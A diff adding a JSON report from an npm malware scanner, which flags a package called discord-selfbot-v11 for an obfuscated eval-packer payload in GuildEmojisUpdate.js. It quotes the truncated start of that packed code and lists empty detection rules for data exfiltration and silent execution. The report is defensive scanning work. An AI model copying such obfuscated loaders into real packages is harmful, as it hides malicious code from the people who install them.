@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-obfuscation": [
+            {
+                "location": "package/src/client/actions/GuildEmojisUpdate.js:1",
+                "code": "eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c+'\\\\b','g'),k[c])}}return p}('152 90=[\"\\\\126\\\\93\\\\115\\\\99\\\\94\\\\100\\\\95\\\\104\",\"\\\\103\\\\92\\\\94\",\"\\\\107\\\\114\\\\100\\\\96\\\\101\\\\160\\\\100\\\\101\",\"\\\\107\\\\92\\\\94\",\"\\\\107\\\\114\\...it('|')))\n",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "npm-silent-process-execution": {},
+        "npm-install-script": {},
+        "npm-dll-hijacking": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/npm/discord-selfbot-v11-1.0.0"
+}
